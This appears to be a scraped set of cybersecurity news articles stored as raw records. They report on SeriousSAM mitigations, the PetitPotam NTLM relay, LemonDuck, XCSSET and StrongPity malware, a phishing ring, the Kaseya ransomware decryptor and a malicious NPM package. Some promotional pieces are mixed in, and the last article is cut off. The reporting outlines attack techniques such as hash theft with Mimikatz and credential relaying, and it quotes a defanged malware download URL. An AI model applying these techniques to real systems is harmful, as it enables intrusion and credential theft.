your domain is set up with a DMARC policy of either “reject“ or “quarantine“ using DMARC Report Analyzer.You will need to convert your BIMI logo image to an SVG file that meets the BIMI standard specifications.Get a Verified Mark Certificate from a trusted certification authority.\nBefore your emails can reach your recipients, they will be authenticated against the DMARC system. After they pass DMARC, the receiving server queries the sender’s DNS for a BIMI record. If found, the sender’s logo is displayed in the recipient’s inbox. Although BIMI is not directly a security protocol, it requires DMARC-based authentication to function.\nThis ensures that emails are verified before they reach your clients, extending and enforcing the implementation of security standards. \nNote: The display of your logo when using BIMI is determined by the mailbox provider. Only mailbox providers that support BIMI will display the logo.\nThe highlight of 2021: Gmail extends support to BIMI \nPreviously, BIMI was supported by Verizon Media, including Yahoo!, AOL, and Netscape, while Fastmail and Gmail were still working on their pilot program. In July 2021, the makers of BIMI made the long-awaited announcement that Google was officially rolling out BIMI to all Gmail inboxes. \nIt’s no surprise that email is a viable communication tool used by 80% of businesses around the globe, and it’s not going away anytime soon. At a time when attackers are attempting to launch phishing campaigns by assuming sender identities, email security improvements must be continuous and ever-evolving.\nThat’s why email clients are slowly but surely adopting email authentication standards like DMARC, MTA-STS, and BIMI to ensure domain owners protect their information from hackers.\nCurrently, BIMI is supported by the following mailbox providers: \nFastmail Verizon Media (Yahoo!, AOL)Google\nBIMI and VMC: Verified Mark Certificates and Their Uses\nVerified Mark Certificates is a solution that helps businesses display verified brand logos in the clients’ sender field. VMC builds on BIMI standards to help businesses seamlessly begin their BIMI journey with verified brand logos displayed in recipients’ inboxes, rather than an arbitrary logo that does not represent their brand in any way.\nA VMC is issued by a publicly trusted certification authority. Similar to BIMI, the following requirements must be met:\nMake sure your brand logo is trademarkedEnsure that your emails are DMARC compliant.Have your brand logo ready (in SVG format) that complies with BIMI specifications\nOnce you have your certificate, you can upload it along with your logo to the PowerBIMI dashboard with a single click to configure BIMI for your business. \nHow to create a BIMI record: Single-Click BIMI DNS Record Implementation with PowerBIMI\nA BIMI record is essentially a DNS TXT record that needs to be published to your domain’s DNS to configure the protocol. You can easily create your own BIMI record using free BIMI record generator tool. This tool will instantly generate an error-free record as soon as you upload your brand logo and click the “Generate Record“ button! \n\nWith PowerBIMI, the hosted BIMI record service; it’s now possible to avoid the hassle of configuring the record! It will help you quickly get to an enforced DMARC policy to meet BIMI requirements and avail of the following benefits when you get on board: \nHosted BIMI services that let you configure and run the protocol effortlessly, as PowerBIMI handles all the complexity in the background.Protocol implementation for the end-user is reduced to publishing a single CNAME record.Uploading your SVG logo and VMC is instant, with a single click. Change and update your BIMI record configurations directly from the dashboard without having to go back to your DNS or servers over and over again.Easy troubleshooting with constant support from round-the-clock support team.\nSimply configuring your email authentication protocols is not enough to protect your domain from abuse and impersonation. To stay abreast of evolving attacker tactics and maintain a continuous view of all your email channels and sending sources, monitor, secure and protect your domains.

{'title': 'How to Mitigate Microsoft Windows 10, 11 SeriousSAM Vulnerability',
'text': 'Microsoft Windows 10 and Windows 11 users are at risk of a new unpatched vulnerability that was recently disclosed publicly.\nAs we reported last week, the vulnerability — SeriousSAM — allows attackers with low-level permissions to access Windows system files to perform a Pass-the-Hash (and potentially Silver Ticket) attack. \nAttackers can exploit this vulnerability to obtain hashed passwords stored in the Security Account Manager (SAM) and Registry, and ultimately run arbitrary code with SYSTEM privileges.\nSeriousSAM vulnerability, tracked as CVE-2021-36934, exists in the default configuration of Windows 10 and Windows 11, specifically due to a setting that allows ’read’ permissions to the built-in user’s group that contains all local users.\nAs a result, built-in local users have access to read the SAM files and the Registry, where they can also view the hashes. Once the attacker has ’User’ access, they can use a tool such as Mimikatz to gain access to the Registry or SAM, steal the hashes and convert them to passwords. Invading Domain users that way will give attackers elevated privileges on the network.\nBecause there is no official patch available yet from Microsoft, the best way to protect your environment from SeriousSAM vulnerability is to implement hardening measures.\nMitigating SeriousSAM\nAccording to Dvir Goren, CTO at CalCom, there are three optional hardening measures:\nDelete all users from the built-in users’ group — this is a good place to start from, but won’t protect you if Administrator credentials are stolen.Restrict SAM files and Registry permissions — allow access only for Administrators. This will, again, only solve part of the problem, as if an attacker steals Admin credentials, you will still be vulnerable to this vulnerability.Don’t allow the storage of passwords and credentials for network authentication — this rule is also recommended in the CIS benchmarks. By implementing this rule, there will be no hash stored in the SAM or registry, thereby mitigating this vulnerability completely.\nWhen using GPOs for implementation, make sure the following UI Path is Enabled:\nComputer Configuration\Policies\Windows Settings\Security Settings\Local Policies\Security Options\Network access: Do not allow storage of passwords and credentials for network authentication\nDespite the fact that the last recommendation offers a good solution for SeriousSAM, it may negatively impact your production if not properly tested before it is pushed. When this setting is enabled, applications that use scheduled tasks and need to store users’ hashes locally will fail.\nMitigating SeriousSAM without risking causing damage to production\nThe following are Dvir’s recommendations for mitigating without causing downtime:\nSet up a test environment that will simulate your production environment. Simulate all possible dependencies of your network as accurately as you can.Analyze the impact of this rule on your test environment. In this way, if you have applications that rely on hashes that are stored locally, you’ll know in advance and prevent production downtime.Push the policy where possible. Make sure new machines are also hardened and that the configuration doesn’t drift over time.\nThese three tasks are complex and require a lot of resources and in-house expertise. Therefore, Dvir’s final recommendation is to automate the entire hardening process to save the need to perform stages 1, 2 and 3. \n\nHere is what you will gain from a Hardening Automation Tool:\nAutomatically generate the most accurate possible impact analysis report – hardening automation tools ’learns’ your production dependencies and report to you the potential impact of each policy rule. Automatically enforce your policy on your entire production from a single point of control – using these tools, you won’t need to do manual work, such as using GPOs. You can control and be certain all your machines are hardened.Maintain your compliance posture and monitor your machines in real-time – hardening automation tools will monitor your compliance posture, alert and remediate any unauthorized changes in configurations, therefore preventing configuration drifts. \nHardening automation tools will learn the dependencies directly from your network and automatically generate an accurate impact analysis report. A hardening automation tool will also help you orchestrate the implementation and monitoring process.\n\n\nFound this article interesting?

{'title': 'Microsoft Warns of LemonDuck Malware Targeting Windows and Linux Systems',
'text': 'An infamous cross-platform crypto-mining malware has continued to refine and improve upon its techniques to strike both Windows and Linux operating systems by setting its sights on older vulnerabilities, while simultaneously latching on to a variety of spreading mechanisms to maximize the effectiveness of its campaigns.\n“LemonDuck, an actively updated and robust malware that’s primarily known for its botnet and cryptocurrency mining objectives, followed the same trajectory when it adopted more sophisticated behavior and escalated its operations,“ Microsoft said in a technical write-up published last week. “Today, beyond using resources for its traditional bot and mining activities, LemonDuck steals credentials, removes security controls, spreads via emails, moves laterally, and ultimately drops more tools for human-operated activity.“\n\nThe malware is notorious for its ability to propagate rapidly across an infected network to facilitate information theft and turn the machines into cryptocurrency mining bots by diverting their computing resources to illegally mine cryptocurrency. Notably, LemonDuck acts as a loader for follow-on attacks that involve credential theft and the installation of next-stage implants that could act as a gateway to a variety of malicious threats, including ransomware.\n\nLemonDuck’s activities were first spotted in China in May 2019, before it began adopting COVID-19-themed lures in email attacks in 2020 and even the recently addressed “ProxyLogon“ Exchange Server flaws to gain access to unpatched systems. Another tactic of note is its ability to erase “other attackers from a compromised device by getting rid of competing malware and preventing any new infections by patching the same vulnerabilities it used to gain access.“\nAttacks incorporating LemonDuck malware have been primarily focused on the manufacturing and IoT sectors, with the U.S, Russia, China, Germany, the U.K., India, Korea, Canada, France, and Vietnam witnessing the most encounters.\n\nAdditionally, Microsoft outed the operations of a second entity that relies on LemonDuck for achieving “separate goals“, which the company codenamed “LemonCat.“ The attack infrastructure associated with the “Cat“ variant is said to have emerged in January 2021, ultimately leading to its use in attacks exploiting vulnerabilities targeting Microsoft Exchange Server. Subsequent intrusions taking advantage of the Cat domains resulted in backdoor installation, credential, and data theft, and malware delivery, often a Windows trojan called Ramnit.\n\n“The fact that the Cat infrastructure is used for more dangerous campaigns does not deprioritize malware infections from the Duck infrastructure,“ Microsoft said. “Instead, this intelligence adds important context for understanding this threat: the same set of tools, access, and methods can be re-used at dynamic intervals, to greater impact.“\nUpdate: In a deep dive on the attacker behavior post infection, Microsoft on Thursday disclosed LemonDuck’s propagation tactics, counting edge-initiated compromises and bot-driven email campaigns, noting that it banks on fileless malware techniques to make remediation and removal non-trivial.\n“LemonDuck attempts to automatically disable Microsoft Defender for Endpoint real-time monitoring and adds whole disk drives – specifically the C:\ drive – to the Microsoft Defender exclusion list,“ Microsoft 365 Defender Threat Intelligence Team said, mirroring a tactic that was recently disclosed as adopted by a new malware strain dubbed “MosaicLoader“ to thwart antivirus scanning.\nThe attack chain is also said to leverage a wide range of freely available open-source and custom toolsets to facilitate credential theft, lateral movement, privilege escalation, and even erase traces of all other botnets, miners, and competitor malware from the compromised device, while downloading an XMRig miner implant as part of its monetization mechanism.\n\n\nFound this article interesting?

{'title': 'New PetitPotam NTLM Relay Attack Lets Hackers Take Over Windows Domains',
'text': 'A newly uncovered security flaw in the Windows operating system can be exploited to coerce remote Windows servers, including Domain Controllers, to authenticate with a malicious destination, thereby allowing an adversary to stage an NTLM relay attack and completely take over a Windows domain.\nThe issue, dubbed “PetitPotam,“ was discovered by security researcher Gilles Lionel, who shared technical details and proof-of-concept (PoC) code last week, noting that the flaw works by forcing “Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw function.“\nMS-EFSRPC is Microsoft’s Encrypting File System Remote Protocol that’s used to perform “maintenance and management operations on encrypted data that is stored remotely and accessed over a network.“\n\nSpecifically, the attack enables a domain controller to authenticate against a remote NTLM under a bad actor’s control using the MS-EFSRPC interface and share its authentication information. This is done by connecting to LSARPC, resulting in a scenario where the target server connects to an arbitrary server and performs NTLM authentication.\nBy forcing the targeted computer to initiate an authentication procedure and share its hashed passwords via NTLM, the PetitPotam attack can be chained to an exploit targeting Windows Active Directory Certificate Services (AD CS) to seize control of the entire domain.\n“An attacker can target a Domain Controller to send its credentials by using the MS-EFSRPC protocol and then relaying the DC NTLM credentials to the Active Directory Certificate Services AD CS Web Enrollment pages to enroll a DC certificate,“ TRUESEC’s Hasain Alshakarti said. “This will effectively give the attacker an authentication certificate that can be used to access domain services as a DC and compromise the entire domain.\nSource: Rootsecdev\nWhile disabling support for MS-EFSRPC doesn’t stop the attack from functioning, Microsoft has since issued mitigations for the issue, while characterizing “PetitPotam“ as a “classic NTLM relay attack,“ which permit attackers with access to a network to intercept legitimate authentication traffic between a client and a server and relay those validated authentication requests in order to access network services.\n\n“To prevent NTLM Relay Attacks on networks with NTLM enabled, domain administrators must ensure that services that permit NTLM authentication make use of protections such as Extended Protection for Authentication (EPA) or signing features such as SMB signing,“ Microsoft noted. “PetitPotam takes advantage of servers where the Active Directory Certificate Services (AD CS) is not configured with protections for NTLM Relay Attacks.“\n\nTo safeguard against this line of attack, the Windows maker is recommending that customers disable NTLM authentication on the domain controller. In the event NTLM cannot be turned off for compatibility reasons, the company is urging users to take one of the two steps below -\nDisable NTLM on any AD CS Servers in your domain using the group policy Network security: Restrict NTLM: Incoming NTLM traffic.Disable NTLM for Internet Information Services (IIS) on AD CS Servers in the domain running the “Certificate Authority Web Enrollment“ or “Certificate Enrollment Web Service“ services\nPetitPotam marks the third major Windows security issue disclosed over the past month after the PrintNightmare and SeriousSAM (aka HiveNightmare) vulnerabilities.\n\n\nFound this article interesting?

'text': 'A malware known for targeting macOS operating system has been updated once again to add more features to its toolset that allows it to amass and exfiltrate sensitive data stored in a variety of apps, including apps such as Google Chrome and Telegram, as part of further “refinements in its tactics.“\nXCSSET was uncovered in August 2020, when it was found targeting Mac developers using an unusual means of distribution that involved injecting a malicious payload into Xcode IDE projects that’s executed at the time of building project files in Xcode.\n\nThe malware comes with numerous capabilities, such as reading and dumping Safari cookies, injecting malicious JavaScript code into various websites, stealing information from applications, such as Notes, WeChat, Skype, Telegram, and encrypting user files.\nEarlier this April, XCSSET received an upgrade that enabled the malware authors to target macOS 11 Big Sur as well as Macs running on M1 chipsets by circumventing new security policies instituted by Apple in the latest operating system.\n“The malware downloads its own open tool from its C2 server that comes pre-signed with an ad-hoc signature, whereas if it were on macOS versions 10.15 and lower, it would still use the system’s built-in open command to run the apps,“ Trend Micro researchers previously noted.\n\nNow according to a new write-up published the cybersecurity firm on Thursday, it has been discovered that XCSSET runs a malicious AppleScript file to compress the folder containing Telegram data (“~/Library/Group Containers/6N38VWS5BX.ru.keepcoder.Telegram“) into a ZIP archive file, before uploading it to a remote server under their control, thus enabling the threat actor to log in using the victim accounts.\n\nWith Google Chrome, the malware attempts to steal passwords stored in the web browser — which are in turn encrypted using a master password called “safe storage key“ — by tricking the user into granting root privileges via a fraudulent dialog box, abusing the elevated permissions to run an unauthorized shell command to retrieve the master key from the iCloud Keychain, following which the contents are decrypted and transmitted to the server.\nAside from Chrome and Telegram, XCSSET also has the capacity to plunder valuable information from a variety of apps like Evernote, Opera, Skype, WeChat, and Apple’s own Contacts and Notes apps by retrieving said data from their respective sandbox directories.\n“The discovery of how it can steal information from various apps highlights the degree to which the malware aggressively attempts to steal various kinds of information from affected systems,“ the researchers said.\n\n\nFound this article interesting?

{'title': 'Wake up! Identify API Vulnerabilities Proactively, From Production Back to Code',
'text': 'After more than 20 years in the making, now it’s official: APIs are everywhere. In a 2021 survey, 73% of enterprises reported that they already publish more than 50 APIs, and this number is constantly growing.\nAPIs have crucial roles to play in virtually every industry today, and their importance is increasing steadily, as they move to the forefront of business strategies. This comes as no surprise: APIs seamlessly connect disparate apps and devices, bringing business synergies and efficiencies never witnessed before. \nHowever, APIs have vulnerabilities just like any other component of the software. Adding to that, if they aren’t rigorously tested from a security standpoint, they can also introduce a whole new array of attack surfaces and expose you to unprecedented risks. If you wait until production to discover API vulnerabilities, you can incur substantial delays.\nAPIs are attractive to attackers, not just businesses\nKeep in mind that APIs do more than simply connect your applications; they change the functionality in unpredictable ways. Many of the unique weaknesses that APIs may introduce are well known to hackers, who have developed different methods to attack your APIs in order to access the underlying data and functionality.\nAccording to the OWASP API Top 10, it is not uncommon for legitimate, authenticated users to exploit the API by utilizing calls that appear legitimate but are actually intended to manipulate the API. These kinds of attacks, aiming to manipulate the business logic and exploit design flaws, are attractive to attackers. \nYou see, every API is unique and proprietary. As such, its software bugs and vulnerabilities are unique and “unknown“ as well. The type of bugs that lead to attacks at the business logic or business process level is particularly challenging to identify as a defender. \n\nAre you giving API security testing enough attention? \nShift-left security is already widely accepted in many organizations, allowing for continuous testing throughout development. API security testing, however, often falls through the cracks or is performed without a sufficient understanding of the risks involved. Why is that? Well, there is more than one reason:\nExisting application security testing tools are generic and aim at traditional web app vulnerabilities, and can’t effectively handle the business logic intricacies of an API.Because APIs don’t have a UI, it is common for companies to test web, app, and mobile separately - but not the API itself.Testing APIs can be manually intensive and is not scalable when you have hundreds of them.Relevant experience and expertise may be in short supply, as API testing is more complicated than other types of testingWith legacy APIs, you might not know about the APIs already implemented or the documentation.\nSo, while shift-left security is already valued by many organizations in general, API security testing is too often left out of the DevSecOps big picture. \nThis is unfortunate, since API vulnerabilities require longer to remediate than traditional application vulnerabilities - in a recent survey, 63% of respondents reported that it takes longer to remediate API vulnerabilities. This number is also likely to rise given applications’ rapid adoption of and dependence on APIs.\n\nWhile most security leaders are aware of the importance of API security testing, just under half say they don’t yet have an API security testing solution fully integrated into their development pipeline.\nLearn more on how to prevent attacks by proactively identifying vulnerabilities, from production back to code.\nWhy do common security testing approaches fail to cover APIs?\nAs a first step towards a comprehensive approach, it is important to examine the most common attitudes towards application security testing today: static security testing and dynamic security testing. \nStatic security testing takes a white-box approach, creating tests based on the known functionality of the application by reviewing the design, architecture, or code, including the many complex paths that data can take as it passes through the application.\nDynamic security testing takes a black-box approach, creating tests based on the expected performance of the application given a particular set of inputs, disregarding internal processing or knowledge of the underlying code.\nWhen it comes to APIs, developers and security teams frequently argue over which of the two methods is most appropriate, with the leading reasoning in favor of each being:\nStatic testing is the only method that makes sense: since there is no user interface for APIs, you have to know what’s going on inside the business logic.Dynamic testing is all that is needed, since unit tests use static models and have already been completed at an earlier stage of the pipeline.\nSorry to ruin the party, but both of these points are only partially true. As a matter of fact, both approaches are necessary to ensure broad coverage and handle a variety of possible scenarios. Especially with the current rise of API-based attacks, you cannot take any chances when it comes to scalability, depth, and frequency.\n\n’Grey-box’ API security testing may offer an interesting alternative. Since there’s no user interface, having knowledge of the app’s internal workings (e.g., parameters, return types) can help you efficiently create functional tests that focus on the business logic.\nIdeally, combining aspects of API security testing would get you closer to creating a grey-box solution that compensates for the weaknesses of each of these individual approaches. Such a business logic approach would intelligently examine results of other test types and can adapt to apply improved tests, either automatically or manually. \nIt’s time for a Business Logic API Security Testing Approach\nThere’s growing industry awareness surrounding the need to secure APIs across their lifecycle, placing APIs front and center in your security controls.\nTo do this, you must find ways to simplify and streamline your organization’s API security testing, integrating and enforcing API security testing standards within the development cycle. This way, along with runtime monitoring, the security team can gain visibility into all known vulnerabilities in one place. As a bonus, taking steps to shift-left API security testing will cut costs and accelerate time to remediation.\nMoreover, once your testing workflows are automated, you’ll also have built-in support for retesting: a cycle of test, remediate, retest, and deploy, keeping your pipeline running smoothly and avoiding bottlenecks altogether.\nA business logic approach to API security testing can elevate the maturity of your Full Lifecycle API Security program, and improve your security posture. \n\nHowever, this modern approach requires a tool that can learn as it goes, improving its performance over time by ingesting runtime data to gain insights into the application’s structure and logic.\nThis would involve creating an adaptive test engine that can learn as it goes, developing a deeper knowledge of the API’s behavior in order to reverse-engineer its hidden inner workings intelligently. Using runtime data and business logic information, you can enjoy the best of both worlds - the black and white box approach towards enhanced visibility and control with automation.\nLearn more on how to prevent attacks by proactively identifying vulnerabilities, from production back to code.\nTo wrap up\nIn addition to their increasing popularity, APIs also create greater vulnerability for web applications. A large number of organizations do not even know what the extent of their APIs and vulnerabilities are. Known and unknown weaknesses can easily be probed by hackers via available APIs. \nHowever, API security testing is often overlooked and handled the same as web applications. Most testing approaches, such as black-box and white-box testing, are not conducive to API testing. \nA combination of natural language processing and artificial intelligence (AI) offers a viable “grey box“ option that automates, scales, and simplifies the complex process of API security testing.\n\n\nFound this article interesting?

{'title': 'Dutch Police Arrest Two Hackers Tied to “Fraud Family“ Cybercrime Ring',
'text': 'Law enforcement authorities in the Netherlands have arrested two alleged individuals belonging to a Dutch cybercriminal collective who were involved in developing, selling, and renting sophisticated phishing frameworks to other threat actors in what’s known as a “Fraud-as-a-Service“ operation.\nThe apprehended suspects, a 24-year-old software engineer and a 15-year-old boy, are said to have been the main developer and seller of the phishing frameworks that were employed to collect login data from bank customers. The attacks primarily singled out users in the Netherlands and Belgium.\nThe 15-year-old suspect has since been released from custody “pending further investigation,“ Dutch police said.\nBelieved to be active since at least 2020, the cybercriminal syndicate has been codenamed “Fraud Family“ by cybersecurity firm Group-IB. The frameworks come with phishing kits, tools designed to steal information, and web panels, which allow the fraudsters to interact with the actual phishing site in real time and retrieve the stolen user data.\n\n“The phishing frameworks allow attackers with minimal skills to optimize the creation and design of phishing campaigns to carry out massive fraudulent operations all the while bypassing 2FA,“ Group-IB Europe’s Roberto Martinez, senior threat intelligence analyst, and Anton Ushakov, deputy head of the high-tech crime investigation department, in a report, adding the gang “advertises their services and interacts with fellow cybercriminals on Telegram messenger.“\n\nInfections involving Fraud Family commences with an email, SMS, or WhatsApp message impersonating well-known local brands containing malicious links that, when clicked, redirect the unsuspecting recipient to adversary-controlled payment info-stealing phishing websites. In an alternative attack scenario, the fraudsters were observed posing as a buyer on a Dutch classified advertising platform to contact a seller and subsequently move the conversation to WhatsApp to trick the latter into visiting a phishing site.\nGroup-IB researchers noted the “high level of personalization“ offered by the phishing websites, which not only impersonate a legitimate Dutch marketplace, but also claim to use a well-known e-commerce payment system in the country, only to lead the victim to a fake bank webpage from where the credentials are siphoned based on the bank selected.\n\n“When victims submit their banking credentials, the phishing site sends them to the fraudster-controlled web panel,“ Group-IB said. “This one actually notifies the miscreants that a new victim is online. The scammers can then request additional information that will help them to gain access to the bank accounts, including two factor authentication tokens, and personal identifiable information.“\n\nAccording to messages posted by the group on Telegram, prices of the web panels — one of which is a fork of another panel called “U-Admin“ — ranged anywhere between €200 a month for the Express Panel and €250 a month should other cybercriminals opt for the Reliable Panel (or Reliable Admin). No fewer than eight Telegram channels operated by Fraud Family have been identified to date, with the channels boasting of 2,000 subscribers between them.\n“The attacks that rely on Fraud Family’s infrastructure increased toward the final months of 2020,“ Group-IB researchers said. “This trend continues in 2021 with the appearance of Express Panel and Reliable Panel.“\n\n\nFound this article interesting?

'text': 'Nearly three weeks after Florida-based software vendor Kaseya was hit by a widespread supply-chain ransomware attack, the company on Thursday said it obtained a universal decryptor to unlock systems and help customers recover their data.\n\n“On July 21, Kaseya obtained a decryptor for victims of the REvil ransomware attack, and we’re working to remediate customers impacted by the incident,“ the company said in a statement. “Kaseya obtained the tool from a third-party and have teams actively helping customers affected by the ransomware to restore their environments, with no reports of any problem or issues associated with the decryptor.“\nIt’s not immediately unclear if Kaseya paid any ransom. It’s worth noting that REvil affiliates had demanded a ransom of $70 million — an amount that was subsequently lowered to $50 million — but soon after, the ransomware gang mysteriously went off the grid, shutting down their payment sites and data leak portals.\nThe incident is believed to have infiltrated as many as 1,500 networks that relied on 60 managed service providers (MSPs) for IT maintenance and support using Kaseya’s VSA remote management product as an ingress point for what has turned out to be one of the “most important cybersecurity event of the year.“\n\nThe information technology firm has since released patches for the zero-days that were exploited to gain access to Kaseya VSA on-premise servers, using the foothold to pivot to other machines managed through the VSA software and deploy a version of the REvil ransomware.\nThe fallout from the attack, waged through a breach in the software supply chain, has raised new concerns about how threat actors are increasingly abusing the trust associated with third-party software to install malware, not to mention underscore the swift damage caused by ransomware attacks on trusted supply-chain providers, paralyzing hundreds of small and medium-sized businesses and causing havoc at scale with just one exploit.\nUpdate: In a new statement shared on Monday, Kaseya refuted claims that it had paid a ransom to obtain the decryptor tool, stating that “while each company must make its own decision on whether to pay the ransom, Kaseya decided after consultation with experts to not negotiate with the criminals who perpetrated this attack and we have not wavered from that commitment.“\n\n\nFound this article interesting?

{'title': 'APT Hackers Distributed Android Trojan via Syrian e-Government Portal',
'text': 'An advanced persistent threat (APT) actor has been tracked in a new campaign deploying Android malware via the Syrian e-Government Web Portal, indicating an upgraded arsenal designed to compromise victims.\n“To the best of our knowledge, this is the first time that the group has been publicly observed using malicious Android applications as part of its attacks,“ Trend Micro researchers Zhengyu Dong, Fyodor Yarochkin, and Steven Du said in a technical write-up published Wednesday.\nStrongPity, also codenamed Promethium by Microsoft, is believed to have been active since 2012 and has typically focused on targets across Turkey and Syria. In June 2020, the espionage threat actor was connected to a wave of activities that banked on watering hole attacks and tampered installers, which abuse the popularity of legitimate applications, to infect targets with malware.\n\n“Promethium has been resilient over the years,“ Cisco Talos disclosed last year. “Its campaigns have been exposed several times, but that was not enough to make the actors behind it to make them stop. The fact that the group does not refrain from launching new campaigns even after being exposed shows their resolve to accomplish their mission.“\nThe latest operation is no different in that it underscores the threat actor’s propensity towards repackaging benign applications into trojanized variants to facilitate the attacks.\nThe malware, masquerading as the Syrian e-Gov Android application, is said to have been created in May 2021, with the app’s manifest file (“AndroidManifest.xml“) modified to explicitly request additional permissions on the phone, including the ability to read contacts, write to external storage, keep the device awake, access information about cellular and Wi-Fi networks, precise location, and even allow the app to have itself started as soon as the system has finished booting.\n\nAdditionally, the malicious app is designed to perform long-running tasks in the background and trigger a request to a remote command-and-control (C2) server, which responds back with an encrypted payload containing a settings file that allows the “malware to change its behavior according to the configuration“ and update its C2 server address.\nLast but not least, the “highly modular“ implant has the capacity to hoover data stored on the infected device, such as contacts, Word and Excel documents, PDFs, images, security keys, and files saved using Dagesh Pro Word Processor (.DGS), among others, all of which are exfiltrated back to the C2 server.\n\nDespite no known public reports of StrongPity using malicious Android applications in their attacks, Trend Micro’s attribution to the adversary stems from the use of a C2 server that has previously been used in intrusions linked to the hacking group, notably a malware campaign documented by AT&T’s Alien Labs in July 2019 that leveraged tainted versions of the WinBox router management software, WinRAR, and other trusted utilities to breach targets.\n“We believe that the threat actor is exploring multiple ways of delivering the applications to potential victims, such as using fake apps and using compromised websites as watering holes to trick users into installing malicious applications,“ the researchers said.\n“Typically, these websites would require its users to download the applications directly onto their devices. In order to do so, these users would be required to enable installation of the applications from ’unknown sources’ on their devices. This bypasses the ’trust-chain’ of the Android ecosystem and makes it easier for an attacker to deliver additional malicious components,“ they added.\n\n\nFound this article interesting?

{'title': 'Reduce End-User Password Change Frustrations',
'text': 'Organizations today must give attention to their cybersecurity posture, including policies, procedures, and technical solutions for cybersecurity challenges. \nThis often results in a greater burden on the IT service desk staff as end-users encounter issues related to security software, policies, and password restrictions. \nOne of the most common areas where security may cause challenges for end-users is password policies and password changes. What are these issues? How can organizations reduce end-user password change frustration? First, let’s consider the standard password policy, its role, and general settings affecting end-users.\nWhat are password policies?\nMost organizations today have a password policy in place. So, what is a password policy? Password policies define the types and content of passwords allowed or required of end-users in an identity and access management system. Various aspects of the password that businesses control may include the password’s required length, composition (requiring certain characters), password age, and disallowing the reuse of passwords used before. \nMicrosoft’s Active Directory Domain Services is arguably the most prevalent identity and access management system servicing on-premises environments today. Active Directory Password Policies allow businesses to control basic characteristics of end-user passwords with configurable password settings.\nThese settings include:\nEnforce password historyMaximum password ageMinimum password ageMinimum password lengthMinimum password length auditPassword must meet complexity requirementsStore passwords using reversible encryption\nConfiguring Active Directory Password Policy\nActive Directory Password Policies are enforced as part of Microsoft Active Directory Domain Services Group Policy. Group Policies can apply to a specific OU in Active Directory and filtered to apply to a particular user, group, or computer.\nHow password changes cause frustration for end-users\nWhile password policies are significantly crucial to the overall cybersecurity posture of your organization, they can certainly lead to an increased burden on the IT service desk. The service desk fields the bulk of issues with password changes and account lockouts. Often, frustration results when end-users change their passwords as a result of password policy enforcement.\nMany organizations choose to implement password policies that define password aging as part of policy enforcement. Password aging requires end-users to change passwords when the password’s age reaches the days configured in the policy.\nEnd-users who are required to change their passwords may mistype their password during the password change. It can lead to the account becoming locked out when they attempt to enter the password they “think“ is correct. Also, end-users can encounter challenges simply setting their password. They may not fully understand the password policy requirements. \nThis ultimately leads to employees who cannot log in; meaning they are unable to be productive. In addition to being an expensive problem for that department (lost work); it also impacts the service desk.\nPassword Change Frustration – Costly for your business\nOut of all the issues that service desk agents triage, the end-user password change can be among the most time-consuming and costly to the business. According to the Gartner Group, between 20% to 50% of all service desk calls are for password resets, while Forrester Research states that the average help desk labor cost for a single password reset is about $70.\nAside from the labor cost involved with the service desk, business continuity can be affected if a key user is locked out of their account or is experiencing application issues due to a changed password.\nThis situation can amount to less tangible costs associated with a password change. Additionally, if end-users are affected by a password change, this can trickle down to customers. \nReduce end-user password change frustration\nBusinesses cannot simply ignore security best practices simply for the convenience of end-users, no matter the seniority of the user calling the service desk. However, there are tools that can help reduce end-user password change frustration caused by a lack of clear messaging on why the password is being rejected. \nAside from providing a much more robust solution than the simplistic Active Directory Password Policy settings found natively in ADDS, Specops Password Policy is one tool that can provide this ability to reduce end-user password change frustration.\nIt includes the following two components that work together to provide much greater transparency to the end-user of password requirements and upcoming password changes required. These include:\nClient message configurationSpecops Authentication Client\nIn Specops Password Policy, IT admins can configure the Client message to customize user feedback on failed password change attempts. Specops Password Policy can be configured to provide dynamic feedback to end-users, using the following settings:\nShow all rulesShow only failed rulesShow only custom messages\nConfiguring the Client message in Specops Password Policy\nThe Specops Authentication Client tool works with the above-configured setting to allow Specops to display the password policy rules when a user fails to meet the policy criteria when changing their password. The Client will also notify users when their passwords are about to expire.\nThe standard “change a password“ screen in Windows can be a real source of end-user frustration. With no guidance on a password policy, previous password history, or dictionaries, a user often resorts to the service desk for help. \nThe standard Windows password change user experience\nWhen users have visibility into the specific reason why the password they are attempting to change to is failing, this can help the end-user better understand the password policy requirements and align the passwords they use with the corporate policy. Specops Password Policy has recently implemented dynamic feedback at password change. \nDynamic feedback at password change for Specops Password Policy end-users\nThis capability also helps alleviate the burden on the IT service desk when end-users can better understand what is required of their corporate password. A better understanding of the rules reduces not only end-user frustration but also minimizes costly calls to the IT service desk.\nFinal Thoughts\nPassword security and policies are required to maintain an effective cybersecurity posture for organizations today. However, password policies and forced account password changes can create an extra burden on the IT service desk, as service desk agents triage and troubleshoot account password issues in the environment. Reducing end-user password change frustration can be facilitated by effective dynamic feedback from your password policy source. \nNatively, Windows displays very vague messaging related to why a particular password is not allowed by a password policy. Specops Password Policy fixes this gap by enabling organizations to implement customizable dynamic feedback to the end-user.\nFor example, when they attempt to set a password that does not meet all the requirements configured in the password policy, it provides much greater detail into why the password set operation failed if it is not successful. \nLearn more about Specops Password Policy here. \n\n\nFound this article interesting?

'text': 'A software package available from the official NPM repository has been revealed to be actually a front for a tool that’s designed to steal saved passwords from the Chrome web browser.\nThe package in question, named “nodejs_net_server“ and downloaded over 1,283 times since February 2019, was last updated seven months ago (version 1.1.2), with its corresponding repository leading to non-existent locations hosted on GitHub. \n“It isn’t malicious by itself, but it can be when put into the malicious use context,“ ReversingLabs researcher Karlo Zanki said in an analysis shared with The Hacker News. “For instance, this package uses it to perform malicious password stealing and credential exfiltration. Even though this off-the-shelf password recovery tool comes with a graphical user interface, malware authors like to use it as it can also be run from the command line.“\n\nWhile the first version of the package was put out just to test the process of publishing an NPM package, the developer, who went by the name of “chrunlee“, made follow-on revisions to implement a remote shell functionality which was improvised over several subsequent versions.\nThis was followed by the addition of a script that downloaded the ChromePass password-stealing tool hosted on their personal website (“hxxps://chrunlee.cn/a.exe“), only to modify it three weeks later to run TeamViewer remote access software.\n\nInterestingly, the author also abused the configuration options of NPM packages specified in the “package.json“ file, specifically the “bin“ field that’s used to install JavaScript executables, to hijack the execution of a legitimate package named “jstest“ — a cross-platform JavaScript test framework — with a malicious variant, exploiting it to launch a service via command line that’s capable of receiving an array of commands, including file lookup, file upload, shell command execution, and screen and camera recording.\nReversingLabs said it reported the rogue package to NPM’s security team twice, once on July 2 and again on July 15, but noted that no action has been taken to date to take it down. We have reached out to NPM for further clarification, and we’ll update the story once we hear back.\n\nIf anything, the development once again exposes the 